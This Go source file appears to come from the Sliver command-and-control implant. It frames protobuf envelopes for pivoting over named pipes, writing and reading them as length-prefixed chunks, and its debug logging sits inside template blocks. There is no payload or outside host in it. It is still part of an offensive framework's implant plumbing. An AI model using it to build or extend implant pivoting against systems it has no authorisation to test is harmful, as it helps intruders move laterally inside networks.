package namedpipe

import (
	"bytes"
	"encoding/binary"

	// {{if .Debug}}
	"log"
	// {{end}}

	pb "github.com/bishopfox/sliver/protobuf/sliver"
	"github.com/golang/protobuf/proto"
)

const (
	readBufSize  = 256
	writeBufSize = 256
)

// TODO: HANDLE ERROR DOUBLE OPEN OR OPENNING AGAIN THE SAME PIPE

// PivotWriteEnvelope - Writes a protobuf envolope to a generic connection
func PivotWriteEnvelope(conn *PipeConn, envelope *pb.Envelope) error {

	// {{if .Debug}}
	log.Printf("IN namedpipe.PivotWriteEnvelope\n")
	// {{end}}

	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Debug}}
		log.Print("Envelope marshaling error: ", err)
		// {{end}}
		return err
	}
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
	(*conn).Write(dataLengthBuf.Bytes())

	totalWritten := 0
	for totalWritten < len(data)-writeBufSize {
		n, err2 := (*conn).Write(data[totalWritten : totalWritten+writeBufSize])
		totalWritten += n
		if err2 != nil {
			// {{if .Debug}}
			log.Printf("namedpipe.PivotWriteEnvelope error %v\n", err2)
			// {{end}}
		}
		// {{if .Debug}}
		log.Printf("namedpipe.PivotWriteEnvelope WRITE LOOP totalWritten=%d n=%d TOTAL=%d\n", totalWritten, n, len(data))
		// {{end}}
	}
	if totalWritten < len(data) {
		missing := len(data) - totalWritten
		_, err := (*conn).Write(data[totalWritten : totalWritten+missing])
		if err != nil {
			// {{if .Debug}}
			log.Printf("namedpipe.PivotWriteEnvelope error %v\n", err)
			// {{end}}
		}
	}

	// {{if .Debug}}
	log.Printf("OUT namedpipe.PivotWriteEnvelope\n")
	// {{end}}

	return nil
}

// PivotReadEnvelope - Reads a protobuf envolope from a generic connection
func PivotReadEnvelope(conn *PipeConn) (*pb.Envelope, error) {

	// {{if .Debug}}
	log.Printf("IN namedpipe.PivotReadEnvelope\n")
	// {{end}}

	dataLengthBuf := make([]byte, 4)
	_, err := conn.Read(dataLengthBuf)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Named Pipe error (read msg-length): %v\n", err)
		// {{end}}
		return nil, err
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))
	// {{if .Debug}}
	log.Printf("namedpipe.PivotReadEnvelope found envolope of %d bytes\n", dataLength)
	// {{end}}
	readBuf := make([]byte, readBufSize)
	dataBuf := make([]byte, 0)
	totalRead := 0
	for {
		n, err := conn.Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			// {{if .Debug}}
			log.Printf("Read error: %s\n", err)
			// {{end}}
			break
		}
	}
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Unmarshaling envelope error: %v", err)
		// {{end}}
		return &pb.Envelope{}, err
	}

	// {{if .Debug}}
	log.Printf("OUT namedpipe.PivotReadEnvelope\n")
	// {{end}}

	return envelope, nil
}
